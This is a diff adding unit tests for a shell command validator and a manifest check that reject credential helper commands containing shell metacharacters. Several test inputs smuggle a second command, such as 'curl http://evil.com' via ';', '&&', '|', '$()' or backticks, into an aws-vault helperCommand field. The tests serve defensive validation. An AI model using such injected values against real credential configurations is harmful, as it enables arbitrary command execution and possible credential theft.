@@ -12,6 +12,7 @@ import {
   validateCommand,
   matchesArgvPattern,
   extractShellBinary,
+  containsShellMetacharacters,
 } from "../commands/validator.js";
 
 // ---------------------------------------------------------------------------
@@ -984,5 +985,187 @@ describe("DENIED_BINARIES set", () => {
     ]) {
       expect(DENIED_BINARIES.has(binary)).toBe(true);
     }
+  });
+});
+
+// ---------------------------------------------------------------------------
+// extractShellBinary: backslash-escaped spaces in env assignments
+// ---------------------------------------------------------------------------
+
+describe("extractShellBinary — escaped spaces in env assignments", () => {
+  test("handles backslash-escaped space in bare env value", () => {
+    // AWS_PROFILE=prod\ account curl ... should parse as binary "curl",
+    // not "account" (the escaped space is part of the value).
+    expect(extractShellBinary("AWS_PROFILE=prod\\ account curl https://example.com")).toBe("curl");
+  });
+
+  test("handles multiple backslash-escaped spaces in bare env value", () => {
+    expect(extractShellBinary("FOO=a\\ b\\ c curl https://example.com")).toBe("curl");
+  });
+
+  test("handles backslash-escaped character in bare env value (no space)", () => {
+    expect(extractShellBinary("FOO=bar\\nbaz curl https://example.com")).toBe("curl");
+  });
+
+  test("still works with unescaped bare values", () => {
+    expect(extractShellBinary("AWS_PROFILE=prod curl https://example.com")).toBe("curl");
+  });
+});
+
+// ---------------------------------------------------------------------------
+// containsShellMetacharacters
+// ---------------------------------------------------------------------------
+
+describe("containsShellMetacharacters", () => {
+  test("detects semicolon", () => {
+    expect(containsShellMetacharacters("aws-vault exec; curl http://evil.com")).toBe(true);
+  });
+
+  test("detects &&", () => {
+    expect(containsShellMetacharacters("aws-vault exec && curl http://evil.com")).toBe(true);
+  });
+
+  test("detects ||", () => {
+    expect(containsShellMetacharacters("aws-vault exec || curl http://evil.com")).toBe(true);
+  });
+
+  test("detects single pipe", () => {
+    expect(containsShellMetacharacters("aws-vault exec | curl http://evil.com")).toBe(true);
+  });
+
+  test("detects $() command substitution", () => {
+    expect(containsShellMetacharacters("aws-vault exec $(curl http://evil.com)")).toBe(true);
+  });
+
+  test("detects backtick command substitution", () => {
+    expect(containsShellMetacharacters("aws-vault exec `curl http://evil.com`")).toBe(true);
+  });
+
+  test("allows clean commands without metacharacters", () => {
+    expect(containsShellMetacharacters("aws-vault exec default --json")).toBe(false);
+  });
+
+  test("allows flags with dashes and equals", () => {
+    expect(containsShellMetacharacters("/usr/local/bin/aws-vault exec prod --format=json")).toBe(false);
+  });
+
+  test("allows env var assignments", () => {
+    expect(containsShellMetacharacters("AWS_PROFILE=prod aws-vault exec default")).toBe(false);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// helperCommand shell metacharacter rejection (manifest validation)
+// ---------------------------------------------------------------------------
+
+describe("helperCommand shell metacharacter rejection", () => {
+  test("rejects helperCommand with semicolon chaining", () => {
+    const result = validateManifest(
+      buildManifest({
+        authAdapter: {
+          type: AuthAdapterType.CredentialProcess,
+          helperCommand: "aws-vault exec default; curl http://evil.com",
+          envVarName: "AWS_CREDENTIALS",
+        },
+      }),
+    );
+    expect(result.valid).toBe(false);
+    expect(
+      result.errors.some((e) => e.includes("shell metacharacters")),
+    ).toBe(true);
+  });
+
+  test("rejects helperCommand with && chaining", () => {
+    const result = validateManifest(
+      buildManifest({
+        authAdapter: {
+          type: AuthAdapterType.CredentialProcess,
+          helperCommand: "aws-vault exec default && curl http://evil.com",
+          envVarName: "AWS_CREDENTIALS",
+        },
+      }),
+    );
+    expect(result.valid).toBe(false);
+    expect(
+      result.errors.some((e) => e.includes("shell metacharacters")),
+    ).toBe(true);
+  });
+
+  test("rejects helperCommand with || chaining", () => {
+    const result = validateManifest(
+      buildManifest({
+        authAdapter: {
+          type: AuthAdapterType.CredentialProcess,
+          helperCommand: "aws-vault exec default || curl http://evil.com",
+          envVarName: "AWS_CREDENTIALS",
+        },
+      }),
+    );
+    expect(result.valid).toBe(false);
+    expect(
+      result.errors.some((e) => e.includes("shell metacharacters")),
+    ).toBe(true);
+  });
+
+  test("rejects helperCommand with pipe", () => {
+    const result = validateManifest(
+      buildManifest({
+        authAdapter: {
+          type: AuthAdapterType.CredentialProcess,
+          helperCommand: "aws-vault exec default | curl http://evil.com",
+          envVarName: "AWS_CREDENTIALS",
+        },
+      }),
+    );
+    expect(result.valid).toBe(false);
+    expect(
+      result.errors.some((e) => e.includes("shell metacharacters")),
+    ).toBe(true);
+  });
+
+  test("rejects helperCommand with $() subshell", () => {
+    const result = validateManifest(
+      buildManifest({
+        authAdapter: {
+          type: AuthAdapterType.CredentialProcess,
+          helperCommand: "aws-vault exec $(curl http://evil.com)",
+          envVarName: "AWS_CREDENTIALS",
+        },
+      }),
+    );
+    expect(result.valid).toBe(false);
+    expect(
+      result.errors.some((e) => e.includes("shell metacharacters")),
+    ).toBe(true);
+  });
+
+  test("rejects helperCommand with backtick subshell", () => {
+    const result = validateManifest(
+      buildManifest({
+        authAdapter: {
+          type: AuthAdapterType.CredentialProcess,
+          helperCommand: "aws-vault exec `curl http://evil.com`",
+          envVarName: "AWS_CREDENTIALS",
+        },
+      }),
+    );
+    expect(result.valid).toBe(false);
+    expect(
+      result.errors.some((e) => e.includes("shell metacharacters")),
+    ).toBe(true);
+  });
+
+  test("accepts clean helperCommand without metacharacters", () => {
+    const result = validateManifest(
+      buildManifest({
+        authAdapter: {
+          type: AuthAdapterType.CredentialProcess,
+          helperCommand: "aws-vault exec default --json",
+          envVarName: "AWS_CREDENTIALS",
+        },
+      }),
+    );
+    expect(result.valid).toBe(true);
+    expect(result.errors).toHaveLength(0);
   });
 });
